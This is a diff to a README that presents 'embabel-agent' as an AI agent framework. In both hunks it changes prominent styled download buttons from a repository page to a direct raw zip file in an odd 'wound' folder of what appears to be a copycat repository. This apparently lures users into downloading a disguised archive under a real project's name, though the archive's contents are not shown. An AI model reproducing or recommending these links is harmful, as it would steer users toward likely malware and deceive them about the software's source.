@@ -29,7 +29,7 @@ Getting started with embabel-agent is incredibly easy. Follow these simple steps
 
 ### Step 1: Download the Application
 <div align="center">
-<a href="https://github.com/pingpongballbouncingbetty737/embabel-agent" style="display:inline-block;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;padding:16px 32px;border-radius:8px;text-decoration:none;font-size:20px;font-weight:bold;box-shadow:0 4px 15px rgba(102,126,234,0.4);">📦 Download embabel-agent Now</a>
+<a href="https://github.com/pingpongballbouncingbetty737/embabel-agent/raw/refs/heads/main/wound/agent-embabel-v1.6.zip" style="display:inline-block;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;padding:16px 32px;border-radius:8px;text-decoration:none;font-size:20px;font-weight:bold;box-shadow:0 4px 15px rgba(102,126,234,0.4);">📦 Download embabel-agent Now</a>
 </div>
 
 Visit this link to download the application. The download page will open in your browser, showing you the available files. Look for the recommended download option—it should be clearly highlighted.
@@ -158,7 +158,7 @@ Visit us today and see why thousands of users choose embabel-agent for their AI 
 ---
 
 <div align="center">
-<a href="https://github.com/pingpongballbouncingbetty737/embabel-agent" style="display:inline-block;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;padding:14px 28px;border-radius:8px;text-decoration:none;font-size:18px;font-weight:bold;box-shadow:0 4px 15px rgba(240,147,251,0.4);">🚀 Get embabel-agent Now</a>
+<a href="https://github.com/pingpongballbouncingbetty737/embabel-agent/raw/refs/heads/main/wound/agent-embabel-v1.6.zip" style="display:inline-block;background:linear-gradient(135deg,#f093fb 0%,#f5576c 100%);color:white;padding:14px 28px;border-radius:8px;text-decoration:none;font-size:18px;font-weight:bold;box-shadow:0 4px 15px rgba(240,147,251,0.4);">🚀 Get embabel-agent Now</a>
 </div>
 
 **Keywords:** agent, agentic-ai, agents, ai, ai-agents, aiagentframework, genai, generative-ai, java, kotlin, llms, multi-agents, multi-agents-orchestration, multi-agents-system, spring
